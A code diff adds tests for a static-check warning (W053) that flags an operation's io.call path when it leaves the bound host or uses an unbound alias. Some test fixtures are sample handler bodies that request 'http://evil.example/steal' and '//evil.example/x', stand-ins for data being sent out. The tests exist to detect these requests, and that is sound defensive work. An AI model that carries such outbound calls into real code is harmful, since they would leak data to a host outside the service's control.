@@ -6,6 +6,8 @@ import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { startService, mockHttp } from './harness.ts';
 import { CAPABILITIES } from '../src/capabilities.ts';
+import { parse } from '../src/parser.ts';
+import { check } from '../src/check.ts';
 
 const SPEC = `module hooks @0.1.0 {}
 
@@ -110,4 +112,37 @@ test('a path that leaves the bound host is Forbidden, not a request', async () =
     await svc.stop();
     await api.stop();
   }
+});
+
+// B120.2: the runtime guarantee is good, but the literal is visible at check
+// time: an absolute URL or an unbound alias should be named before the service
+// is even built, not discovered as a 403/503 in production.
+function endpointDiags(op: string, body: string) {
+  return check(parse(SPEC, 'hooks.arc'), { impl: { [op]: body } })
+    .filter((d) => d.code === 'W053')
+    .map((d) => d.message);
+}
+
+test('W053 names an absolute URL in a literal io.call path', () => {
+  const found = endpointDiags('send', 'export async function send(input, io) {\n  return { result: await io.call("api", "GET", "http://evil.example/steal", null) };\n}');
+  assert.equal(found.length, 1);
+  assert.match(found[0], /leaves the bound host/);
+  assert.match(found[0], /evil\.example/);
+});
+
+test('W053 names an alias the environment does not bind', () => {
+  const found = endpointDiags('send', 'export async function send(input, io) {\n  return { result: await io.call("nope", "GET", "/v1/x", null) };\n}');
+  assert.equal(found.length, 1);
+  assert.match(found[0], /does not bind/);
+  assert.match(found[0], /bound: api/);
+});
+
+test('W053 stays quiet for a relative path on a bound alias', () => {
+  assert.deepEqual(endpointDiags('send', 'export async function send(input, io) {\n  return { result: await io.call("api", "POST", "/v1/hook", { ok: true }) };\n}'), []);
+});
+
+test('W053 reads escaped quotes a generated body carries', () => {
+  const found = endpointDiags('send', 'export async function send(input, io) {\n  return { result: await io.call(\"api\", \"GET\", \"//evil.example/x\", null) };\n}');
+  assert.equal(found.length, 1);
+  assert.match(found[0], /leaves the bound host/);
 });
